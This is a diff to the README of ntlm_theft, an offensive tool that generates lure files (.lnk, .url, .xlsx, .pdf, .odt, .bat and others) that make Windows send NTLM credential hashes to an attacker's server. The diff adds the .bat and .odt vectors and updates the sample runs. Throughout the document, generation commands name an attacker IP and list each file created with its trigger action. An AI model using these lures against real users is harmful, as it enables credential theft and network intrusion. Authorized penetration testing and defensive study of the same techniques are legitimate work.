@@ -15,6 +15,7 @@ ntlm_theft supports the following attack types:
 	* .scf – via ICONFILE field (Not Working on Latest Windows)
 	* autorun.inf via OPEN field (Not Working on Latest Windows)
 	* desktop.ini - via IconResource field (Not Working on Latest Windows)
+	* .bat – delivered via the URL field or execute via cmd.exe.
 * Open Document
 	* .xml – via Microsoft Word external stylesheet
 	* .xml – via Microsoft Word includepicture field
@@ -28,6 +29,7 @@ ntlm_theft supports the following attack types:
 	* .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
 	* .jnlp – via Java external jar
 	* .application – via any Browser (Must be served via a browser downloaded or won’t run)
+	* .odt – via LibreOffice / OpenOffice
 * Open Document and Accept Popup
 	* .pdf – via Adobe Acrobat Reader
 * Click Link in Chat Program
@@ -50,7 +52,7 @@ These instructions will show you the requirements for and how to use ntlm_theft.
 ntlm_theft requires Python3 and xlsxwriter:
 
 ```
-pip3 install xlsxwriter
+pip3 install -r requirements.txt
 ```
 
 ### Required Parameters
@@ -68,7 +70,7 @@ To start up the tool 4 parameters must be provided, an input format, the input f
 Here is an example of what a run looks like generating all files:
 
 ```
-# python ntlm_theft.py -g all -s 10.11.104.208 -f alienkeric
+# python3 ntlm_theft.py --generate all --server 192.168.10.20 --filename alienkeric
 Created: alienkeric/alienkeric.scf (BROWSE TO FOLDER)
 Created: alienkeric/alienkeric-(url).url (BROWSE TO FOLDER)
 Created: alienkeric/alienkeric-(icon).url (BROWSE TO FOLDER)
@@ -92,8 +94,10 @@ Created: alienkeric/zoom-attack-instructions.txt (PASTE TO CHAT)
 Created: alienkeric/alienkeric.library-ms (BROWSE TO FOLDER)
 Created: alienkeric/Autorun.inf (BROWSE TO FOLDER)
 Created: alienkeric/desktop.ini (BROWSE TO FOLDER)
-Created: alienkeric/alienkeric.theme (THEME TO INSTALL)
+Created: alienkeric/alienkeric.theme (THEME TO INSTALL
 Created: alienkeric/alienkeric.bat (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.website (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.odt (Open in LibreOffice / OpenOffice)
 Generation Complete.
 ```
 
@@ -103,8 +107,7 @@ Generation Complete.
 Here is an example of what a run looks like generating only modern files:
 
 ```
-# python ntlm_theft.py -g modern -s 10.11.104.208 -f alienkeric
-Created: alienkeric/alienkeric.scf (BROWSE TO FOLDER)
+# python3 ntlm_theft.py --generate modern --server 192.168.10.20 --filename alienkeric
 Created: alienkeric/alienkeric-(url).url (BROWSE TO FOLDER)
 Created: alienkeric/alienkeric-(icon).url (BROWSE TO FOLDER)
 Created: alienkeric/alienkeric.lnk (BROWSE TO FOLDER)
@@ -123,26 +126,27 @@ Created: alienkeric/alienkeric.asx (OPEN)
 Created: alienkeric/alienkeric.jnlp (OPEN)
 Created: alienkeric/alienkeric.application (DOWNLOAD AND OPEN)
 Created: alienkeric/alienkeric.pdf (OPEN AND ALLOW)
-Created: alienkeric/zoom-attack-instructions.txt (PASTE TO CHAT)
+Skipping zoom as it does not work on the latest versions
 Created: alienkeric/alienkeric.library-ms (BROWSE TO FOLDER)
-Created: alienkeric/Autorun.inf (BROWSE TO FOLDER)
-Created: alienkeric/desktop.ini (BROWSE TO FOLDER)
-Created: alienkeric/alienkeric.theme (THEME TO INSTALL)
+Skipping Autorun.inf as it does not work on modern Windows
+Skipping desktop.ini as it does not work on modern Windows
+Created: alienkeric/alienkeric.theme (THEME TO INSTALL
 Created: alienkeric/alienkeric.bat (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.website (BROWSE TO FOLDER)
+Created: alienkeric/alienkeric.odt (Open in LibreOffice / OpenOffice)
 Generation Complete.
 ```
 
-Here is an example of what a run looks like generating only a xlsx file:
+Here is an example of what a run looks like generating only a odt file:
 
 ```
-# python3 ntlm_theft.py -g xlsx -s 192.168.1.103 -f Bonus_Payment_Q4
-Created: Bonus_Payment_Q4/Bonus_Payment_Q4-(externalcell).xlsx (OPEN)
+# python3 ntlm_theft.py --generate odt --server 192.168.10.20 --filename alienkeric
+Created: alienkeric/alienkeric.odt (Open in LibreOffice / OpenOffice)
 Generation Complete.
 ```
 
 ## Authors
 * **Jacob Wilkin** - *Research and Development*
-
 
 ## License
 
